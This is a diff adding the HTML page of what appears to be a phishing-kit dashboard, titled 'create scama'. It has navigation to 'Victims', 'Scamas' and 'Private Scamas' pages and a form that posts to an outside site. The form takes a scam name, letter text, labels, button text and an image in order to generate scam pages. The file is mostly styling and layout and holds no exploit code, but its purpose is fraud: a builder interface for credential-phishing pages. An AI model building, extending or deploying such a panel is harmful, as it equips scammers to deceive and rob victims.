@@ -1,0 +1,410 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>create scama</title>
+    <link rel="stylesheet" href="./css/maine.css" />
+    <link rel="stylesheet" href="css/style.css" />
+    <link rel="stylesheet" href="css/bootstrap.css" />
+    <link rel="stylesheet" href="css/bootstrap.css.map" />
+
+    <link
+      rel="stylesheet"
+      href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.7.2/font/bootstrap-icons.css"
+    />
+
+    <style>
+      
+#create-scams .content {
+  padding: 20px;
+}
+
+#create-scams .content .img {
+  padding: 20px;
+  margin: 5px auto;
+  display: -webkit-box;
+  display: -ms-flexbox;
+  display: flex;
+  -webkit-box-orient: vertical;
+  -webkit-box-direction: normal;
+      -ms-flex-direction: column;
+          flex-direction: column;
+  -ms-flex-pack: distribute;
+      justify-content: space-around;
+  -webkit-box-align: center;
+      -ms-flex-align: center;
+          align-items: center;
+  -webkit-box-shadow: 0px 0px 20px 0px #0e0d0de3;
+          box-shadow: 0px 0px 20px 0px #0e0d0de3;
+  border-radius: 10px;
+  -webkit-border-radius: 10px;
+  -moz-border-radius: 10px;
+  -ms-border-radius: 10px;
+  -o-border-radius: 10px;
+  background-color: #9ab3bdd3;
+}
+
+#create-scams .content .img img {
+  -webkit-box-shadow: inherit;
+          box-shadow: inherit;
+}
+
+#create-scams .content .img h2 {
+  text-shadow: 2px 2px black;
+}
+
+#create-scams .content form {
+  padding: 20px;
+  margin: 5px auto;
+  text-align: center;
+  -webkit-box-shadow: 0px 0px 20px 0px black;
+          box-shadow: 0px 0px 20px 0px black;
+  border-radius: 10px;
+  -webkit-border-radius: 10px;
+  -moz-border-radius: 10px;
+  -ms-border-radius: 10px;
+  -o-border-radius: 10px;
+  background-color: #9ab3bdd3;
+}
+
+#create-scams .content form .inputs-img {
+  display: -webkit-box;
+  display: -ms-flexbox;
+  display: flex;
+}
+
+#create-scams .content form .inputs-img .switch {
+  width: 40%;
+  display: -webkit-box;
+  display: -ms-flexbox;
+  display: flex;
+  -webkit-box-align: center;
+      -ms-flex-align: center;
+          align-items: center;
+}
+
+#create-scams .content form .inputs-img .switch .btn-switch {
+  margin: 0 10px 0 0;
+  position: relative;
+  display: inline-block;
+  width: 60px;
+  height: 25px;
+}
+
+#create-scams .content form .inputs-img .switch .btn-switch input {
+  opacity: 0;
+  width: 0;
+  height: 0;
+}
+
+#create-scams .content form .inputs-img .switch .btn-switch input:checked + .slider {
+  background-color: #2196f3;
+}
+
+#create-scams .content form .inputs-img .switch .btn-switch input:checked + .slider::before {
+  right: 0;
+}
+
+#create-scams .content form .inputs-img .switch .btn-switch .slider {
+  position: absolute;
+  cursor: pointer;
+  width: 100%;
+  height: 100%;
+  top: 0;
+  left: 0;
+  background-color: #ccc;
+  -webkit-transition: 0.4s;
+  transition: 0.4s;
+  display: -webkit-box;
+  display: -ms-flexbox;
+  display: flex;
+  -webkit-box-align: center;
+      -ms-flex-align: center;
+          align-items: center;
+  -webkit-box-pack: start;
+      -ms-flex-pack: start;
+          justify-content: flex-start;
+  border-radius: 34px;
+}
+
+#create-scams .content form .inputs-img .switch .btn-switch .slider::before {
+  position: absolute;
+  content: "";
+  width: 27px;
+  height: 27px;
+  background-color: white;
+  border-radius: 50%;
+  -webkit-border-radius: 50%;
+  -moz-border-radius: 50%;
+  -ms-border-radius: 50%;
+  -o-border-radius: 50%;
+}
+
+#create-scams .content form .inputs-img .src-img {
+  width: 60%;
+}
+
+#create-scams .content form .inputs-img .src-img input {
+  width: 100%;
+  color: black;
+  background-color: #b7f0f0;
+  outline: none;
+  border: none;
+  border: 1px solid black;
+  -webkit-box-shadow: 0px 0px 10px 0px #202020;
+          box-shadow: 0px 0px 10px 0px #202020;
+  font-size: 1.2em;
+}
+
+#create-scams .content form .inputs-img .src-img .dnone {
+  display: none;
+}
+
+#create-scams .content form .input-group {
+  background-color: #bdf3f3;
+  margin: 10px 0;
+  padding: 0 10px;
+  color: black;
+  display: -webkit-box;
+  display: -ms-flexbox;
+  display: flex;
+  -webkit-box-align: center;
+      -ms-flex-align: center;
+          align-items: center;
+  -webkit-box-pack: justify;
+      -ms-flex-pack: justify;
+          justify-content: space-between;
+  border: 1px solid black;
+  -webkit-box-shadow: inherit;
+          box-shadow: inherit;
+}
+
+#create-scams .content form .input-group input {
+  width: 90%;
+  height: 100%;
+  padding: 10px 0;
+  outline: none;
+  border: none;
+  background: none;
+  color: black;
+}
+
+#create-scams .content form .input-group i {
+  font-size: 1.3em;
+  width: 10%;
+  text-align: center;
+  color: black;
+}
+
+#create-scams .content form .submit {
+  width: 50%;
+  -webkit-box-shadow: 2px 2px 5px 2px black;
+          box-shadow: 2px 2px 5px 2px black;
+  background-color: #2769f7;
+  font-size: 1.2em;
+}
+    </style>
+  </head>
+  <body>
+    <!-- start-nav navbar--->
+    <nav class="navbar navbar-light bg-gred">
+      <div class="container-fluid container">
+        <div class="toggler btn">
+          <i class="bi bi-list h2 show-menu"></i>
+          <i class="bi bi-x-lg h2 heden-menu"></i>
+        </div>
+        <div>
+          <a href="./SignUpM9wd-1.html" class="btn btn-primary fw-bold h4"
+            >SIGN UP</a
+          >
+
+          <a href="./LoginM9owd.html" class="btn btn-light fw-bold h4"
+            >LOGOUT</a
+          >
+        </div>
+      </div>
+
+      <div class="menu bg-gred">
+        <div class="user">
+          <img src="./imges/logo.jpg" alt="" />
+          <span class="userName h5"> userName</span>
+          <span class="logged text-success"> Logged In</span>
+        </div>
+        <ul>
+          <li>
+            <a href="Home.html">
+              <i class="bi bi-house-door h2"></i>
+              <span class="h4">Home </span>
+            </a>
+          </li>
+          <li>
+            <a href="Victims.html">
+              <i class="bi bi-person-lines-fill h2"></i>
+              <span class="h4">Victims </span>
+            </a>
+          </li>
+          <li>
+            <a href="/Scamas.html">
+              <i class="bi bi-receipt h2"></i> <span class="h4">Scamas </span>
+            </a>
+          </li>
+          <li>
+            <a href="/PrivateScamas.html" class="active">
+              <i class="bi bi-back h2"></i>
+              <span class="h4">Private Scamas </span>
+            </a>
+          </li>
+          <li>   <li>
+            <a href="settings.html" class="link-mune ">
+              <i class="bi bi-gear-fill h2"></i>
+              <span class="h4">Settings</span>
+            </a>
+          </li>
+          <li>
+            <a href="https://www.facebook.com/Black-Scam-103887988825308/" target="blank" class="link-mune">
+              <i class="bi bi-facebook h2"></i>
+              <span class="h4">Contact </span>
+            </a>
+          </li>
+       
+        </ul>
+      </div>
+    </nav>
+    <!-- end-nav -->
+    <div class="bg-page"></div>
+    <!-- ................... content....................................... -->
+
+
+    <div class="container" id="create-scams">
+      <h2 class="title">CREATE YOUR SCAMS</h2>
+      <div class="content row">
+        <div class="img col-12 col-md-10 col-lg-5">
+          <h2>Example</h2>
+          <img src="./imges/scama-img.png" alt="img" class="w-100" />
+        </div>
+        <form
+          action="https://sniperdz.com/?do=mob"
+          class="col-12 col-md-10 col-lg-6"
+        >
+          <div class="inputs-img">
+            <div class="switch">
+              <label class="btn-switch">
+                <input type="checkbox" class="checkbox" />
+                <span class="slider"></span>
+              </label>
+              <span class="lebal-check">Upload Image </span>
+            </div>
+
+            <div class="src-img">
+              <input
+                type="file"
+                name="img-fils"
+                id="img-fils"
+                class="scama-img img-fils "
+              
+              />
+              <input
+                type="text"
+                name="img-link"
+                id="img-link"
+                class="scama-img img-link dnone"
+                placeholder="https://example.link.img.com/"
+              />
+            </div>
+          </div>
+
+          <div class="input-group">
+            <i class="bi bi-file-earmark-text text-dark"></i>
+            <input
+              type="text"
+              id="Scama-Name"
+              name="Scama-Name"
+              placeholder="Scama Name"
+            />
+          </div>
+
+          <div class="input-group">
+            <i class="bi bi-list-columns-reverse text-dark"></i>
+            <input type="text" id="Letter" name="Letter" placeholder="Letter" />
+          </div>
+          <div class="input-group label">
+            <i class="bi bi-list-columns-reverse text-dark"></i>
+            <input
+              type="text"
+              id="Label-1"
+              name="Label-1"
+              placeholder="Label 1"
+            />
+          </div>
+
+          <div class="input-group label">
+            <i class="bi bi-list-columns-reverse text-dark"></i>
+            <input
+              type="text"
+              id="Label-2"
+              name="Label-2"
+              placeholder="Label 2"
+            />
+          </div>
+
+          <div class="input-group">
+            <i class="bi bi-list-columns-reverse text-dark"></i>
+            <input
+              type="text"
+              id="Button-name"
+              name="Button-name"
+              placeholder="Button Name"
+            />
+          </div>
+          <input
+            type="submit"
+            value=" CREATE SCAMA"
+            class="submit btn btn-primary"
+          />
+        </form>
+      </div>
+    </div>
+
+
+
+    
+   
+    
+
+  
+
+ 
+
+
+
+
+
+
+
+    <!-- ............................................................ -->
+   
+   <script>
+let checkbox = document.querySelector(".switch input.checkbox");
+let inputFile = document.querySelector(".img-fils");
+let inputLink = document.querySelector(".img-link");
+checkbox.onclick = function () {
+  if (!inputFile.classList.contains("dnone")) {
+    inputFile.classList.add("dnone");
+    inputLink.classList.remove("dnone");
+  } else {
+    inputLink.classList.add("dnone");
+    inputFile.classList.remove("dnone");
+  }
+}
+   </script>
+   
+   
+    <script src="js/jquery-3.6.0.min.js"></script>
+    <script src="js/popper.min.js"></script>
+    <script src="js/bootstrap.js"></script>
+    <script src="js/bootstrap.js.map"></script>
+    <script src="js/script.js"></script>
+  </body>
+</html>
